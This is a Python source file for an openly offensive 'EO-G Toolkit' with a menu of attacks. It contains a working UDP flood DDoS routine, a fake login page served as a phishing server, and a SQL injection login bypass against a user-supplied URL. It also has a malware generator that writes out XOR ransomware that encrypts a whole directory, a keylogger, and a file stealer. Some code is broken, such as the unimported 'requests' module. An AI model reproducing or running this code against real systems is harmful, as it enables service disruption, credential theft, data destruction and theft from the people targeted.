import os
import socket
import random
import subprocess
from http.server import SimpleHTTPRequestHandler, HTTPServer

# Display Banner
def display_banner():
    banner = """
    ███████╗ ██████╗ ██████╗ ███████╗
    ██╔════╝██╔════╝██╔═══██╗██╔════╝
    █████╗  ██║     ██║   ██║███████╗
    ██╔══╝  ██║     ██║   ██║╚════██║
    ███████╗╚██████╗╚██████╔╝███████║
    ╚══════╝ ╚═════╝ ╚═════╝ ╚══════╝
    EO-G Toolkit with Dynamic Malware Generation
    """
    print(banner)

try:
    display_banner()
except Exception as e:
    print(f"Error displaying banner: {e}")

# EO-G Real System
class EOGReal:
    def __init__(self):
        self.target = None

    def recon_target(self, target_ip):
        """
        Perform actual reconnaissance by pinging the target.
        """
        print(f"Reconnaissance initiated on target: {target_ip}")
        try:
            response = subprocess.run(["ping", "-c", "1", target_ip], capture_output=True, text=True)
            if "1 packets transmitted, 1 received" in response.stdout:
                print(f"Target {target_ip} is active.")
                self.target = target_ip
            else:
                print(f"Target {target_ip} is not responding.")
        except Exception as e:
            print(f"Recon error: {e}")

    def ddos_attack(self, target_ip, duration=10):
        """
        Perform a real UDP flood attack.
        """
        print(f"Starting DDoS attack on {target_ip} for {duration} seconds...")
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random._urandom(1024)
        end_time = os.times().elapsed + duration

        while os.times().elapsed < end_time:
            try:
                sock.sendto(payload, (target_ip, 80))
            except Exception as e:
                print(f"Error during DDoS attack: {e}")
        print("DDoS attack completed.")

    def phishing_page(self, port=8080):
        """
        Set up a real phishing server.
        """
        print(f"Starting phishing server on port {port}")
        phishing_html = """
        <html>
        <body>
            <h1>Secure Login</h1>
            <form method="POST" action="/submit">
                <input type="text" name="username" placeholder="Username"><br>
                <input type="password" name="password" placeholder="Password"><br>
                <button type="submit">Login</button>
            </form>
        </body>
        </html>
        """
        with open("index.html", "w") as f:
            f.write(phishing_html)

        os.chdir(os.path.dirname(os.path.abspath("index.html")))
        try:
            server = HTTPServer(("0.0.0.0", port), SimpleHTTPRequestHandler)
            print(f"Phishing server running at http://0.0.0.0:{port}. Press Ctrl+C to stop.")
            server.serve_forever()
        except KeyboardInterrupt:
            print("\nPhishing server stopped.")
            server.server_close()

    def sql_injection_attack(self, target_url):
        """
        Perform a basic SQL injection attack.
        """
        print(f"Launching SQL injection attack on {target_url}")
        try:
            payload = {"username": "' OR 1=1 --", "password": "irrelevant"}
            response = requests.post(target_url, data=payload)
            if response.status_code == 200:
                print("SQL injection succeeded!")
                print("Response:", response.text)
            else:
                print("SQL injection failed.")
        except Exception as e:
            print(f"Error during SQL injection: {e}")

    def generate_malware(self):
        """
        Generate malware based on user input.
        """
        print("Malware Generation Menu:")
        print("1. Ransomware")
        print("2. Keylogger")
        print("3. File Stealer")
        print("4. Custom Script")
        choice = input("Choose the type of malware to generate: ")

        if choice == "1":
            target_directory = input("Enter the target directory for ransomware (default: /tmp): ") or "/tmp"
            malware_code = f"""
import os

# XOR Encryption Key
key = 0x42

# Target Directory
target_directory = "{target_directory}"

def encrypt_file(file_path):
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        encrypted_data = bytes([b ^ key for b in data])
        with open(file_path, 'wb') as f:
            f.write(encrypted_data)
        print(f"Encrypted: {{file_path}}")
    except Exception as e:
        print(f"Error encrypting {{file_path}}: {{e}}")

for root, dirs, files in os.walk(target_directory):
    for file in files:
        encrypt_file(os.path.join(root, file))
"""
            with open("ransomware.py", "w") as f:
                f.write(malware_code)
            print("Ransomware script saved as 'ransomware.py'.")

        elif choice == "2":
            malware_code = """
import pynput

def on_press(key):
    try:
        with open("keylogs.txt", "a") as f:
            f.write(str(key) + "\\n")
    except Exception as e:
        print(f"Error logging key: {e}")

from pynput.keyboard import Listener
with Listener(on_press=on_press) as listener:
    listener.join()
"""
            with open("keylogger.py", "w") as f:
                f.write(malware_code)
            print("Keylogger script saved as 'keylogger.py'.")

        elif choice == "3":
            target_directory = input("Enter the directory to steal files from (default: /tmp): ") or "/tmp"
            malware_code = f"""
import os
import shutil

# Target Directory
target_directory = "{target_directory}"

# Destination to save stolen files
destination_directory = "/tmp/stolen_files"

if not os.path.exists(destination_directory):
    os.makedirs(destination_directory)

for root, dirs, files in os.walk(target_directory):
    for file in files:
        full_path = os.path.join(root, file)
        try:
            shutil.copy(full_path, destination_directory)
            print(f"Stolen: {{full_path}}")
        except Exception as e:
            print(f"Error stealing file {{full_path}}: {{e}}")
"""
            with open("file_stealer.py", "w") as f:
                f.write(malware_code)
            print("File stealer script saved as 'file_stealer.py'.")

        elif choice == "4":
            print("Custom Script Editor:")
            custom_code = input("Enter your custom Python malware code (end with a blank line):\n")
            with open("custom_malware.py", "w") as f:
                f.write(custom_code)
            print("Custom script saved as 'custom_malware.py'.")

        else:
            print("Invalid choice. Returning to menu.")

# EO-G Control Panel
def eog_control():
    agent = EOGReal()
    while True:
        print("\nEO-G Options:")
        print("1. Recon Target")
        print("2. DDoS Attack")
        print("3. Phishing Server")
        print("4. SQL Injection Attack")
        print("5. Generate Malware")
        print("6. Exit")
        choice = input("Choose an option: ")

        if choice == "1":
            target = input("Enter the target IP: ")
            agent.recon_target(target)
        elif choice == "2":
            target = input("Enter the target IP: ")
            duration = int(input("Enter the attack duration (seconds): "))
            agent.ddos_attack(target, duration)
        elif choice == "3":
            port = int(input("Enter the port for the phishing server: "))
            agent.phishing_page(port)
        elif choice == "4":
            target_url = input("Enter the target URL for SQL injection: ")
            agent.sql_injection_attack(target_url)
        elif choice == "5":
            agent.generate_malware()
        elif choice == "6":
            print("Exiting EO-G Toolkit.")
            break
        else:
            print("Invalid choice. Please try again.")

# Run EO-G Control
if __name__ == "__main__":
    eog_control()
